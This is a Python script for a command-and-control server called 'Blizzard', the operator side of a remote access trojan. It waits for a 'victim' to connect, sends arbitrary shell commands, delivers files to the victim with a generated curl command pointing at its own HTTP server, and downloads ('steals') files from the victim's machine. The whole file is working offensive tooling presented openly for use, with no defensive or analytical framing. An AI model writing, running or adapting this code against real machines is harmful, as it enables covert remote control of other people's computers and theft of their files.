import socket, socketserver, http.server, requests
import random
import subprocess
import threading

# Function to start HTTP server
def http_server(PORT_HTTP):
    # Define the handler to serve files in the current directory
    handler = http.server.SimpleHTTPRequestHandler
    # Create an HTTP server instance with the specified port
    with socketserver.TCPServer(("", PORT_HTTP), handler) as httpd:
        print(f"HTTP server listening on port {PORT_HTTP}")
        # Start serving HTTP requests indefinitely
        httpd.serve_forever()

# Main function to handle the TCP server
def main():
    # Create a TCP socket for the command-and-control server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Get the IP address of the host machine
    HOST = socket.gethostbyname(socket.gethostname())  # Change this if using a different IP
    
    # Define the port for the command-and-control server
    PORT = 13921
    
    # Define the port for the HTTP server
    PORT_HTTP = 8003
    
    # Variable to store a random port for HTTP file transfer
    random_port_http = 0
    
    # Bind the server to the host and port, and listen for incoming connections
    server.bind((HOST, PORT))
    server.listen(1)
    
    # Print initial instructions and messages
    print("WELCOME TO THE BLIZZARD!!!")
    print("If you want to send the victim a file type the command: 'send_file example.txt' and make sure the file is in the directory you are running Blizzard from!")
    print("If you want to steal a file type the command: 'get_file example.txt' and make sure that you are in the directory you are stealing the file from!")
    print("")
    print("Waiting for victim to connect...")
    
    # Start the HTTP server in a separate thread
    t1 = threading.Thread(target=http_server, args=(PORT_HTTP,))
    t1.daemon = True  # Ensures the HTTP server thread will close when the main thread closes
    t1.start()
    
    print(f"Blizzard listening on port {PORT}")
    
    # Main loop to handle incoming client connections
    while True:
        # Accept incoming connection from a client
        client, address = server.accept()
        print(f"WE GOT ONE: {address[0]}")
        
        # Handle commands sent to the client
        try:
            while True:
                # Get the command from the user input
                command = input("Command on victim: ")
                
                # Exit the loop if the user types 'exit'
                if command.lower() == "exit":
                    print("Closing connection.")
                    break
                
                # If the user wants to send a file, modify the command to use curl for file transfer
                if command.startswith("send_file"):
                    command = f"curl -O http://{HOST}:{PORT_HTTP}/{command.split()[1]}"
                
                # If the user wants to get a file, prepare for the file transfer
                if command.startswith("get_file"):
                    filename = command.split()[1]
                    random_port_http = random.randint(40000, 49000)
                    command = f"get_file {random_port_http}"
                
                # Send the command to the client
                client.send(command.encode("utf-8"))
                
                # Receive and decode the response from the client
                response = client.recv(1024).decode("utf-8")
                
                # Handle file download if the response indicates an HTTP file transfer
                if response == f"HTTP {random_port_http}" and command.startswith("get_file"):
                    print("hey")
                    get_file(address[0], random_port_http, filename)
                
                # Print the response from the client
                print(response)
        
        # Handle any exceptions that occur during communication
        except Exception:
            print("The victim disconnected.")
        
        # Ensure the client connection is closed after communication
        finally:
            client.close()

# Function to download a file from the victim's machine via HTTP
def get_file(address, port, filename):
    # Construct the file URL
    file_url = f"http://{address}:{port}/{filename}"
    print(file_url)
    
    connected = False
    
    # Attempt to connect to the HTTP server on the victim's machine
    while not connected:
        try:
            response = requests.get(file_url)
            connected = True
        except Exception:
            print("loading")

    # Check if the request was successful
    if response.status_code == 200:
        # Open a file in binary write mode
        with open(filename, 'wb') as file:
            # Write the content of the response to the file
            file.write(response.content)
        print("File downloaded successfully!")
    else:
        print(f"Failed to download file. HTTP Status Code: {response.status_code}")

# Entry point of the script
if __name__ == "__main__":
    main()
